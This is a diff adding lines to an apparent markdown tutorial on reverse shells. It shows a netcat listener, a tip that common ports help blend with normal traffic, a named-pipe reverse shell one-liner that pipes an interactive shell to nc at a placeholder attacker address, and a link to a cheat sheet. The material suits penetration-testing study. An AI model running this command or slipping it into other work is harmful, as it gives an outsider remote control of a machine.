@@ -40,3 +40,12 @@ listening on [any] 4444 ...
 - `-p`: port
 - Common ports (53, 80, 443, etc.) help blend with normal traffic.
 
+As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.
+
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+```
+
+
+# Reverse Shell Cheat Sheet
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
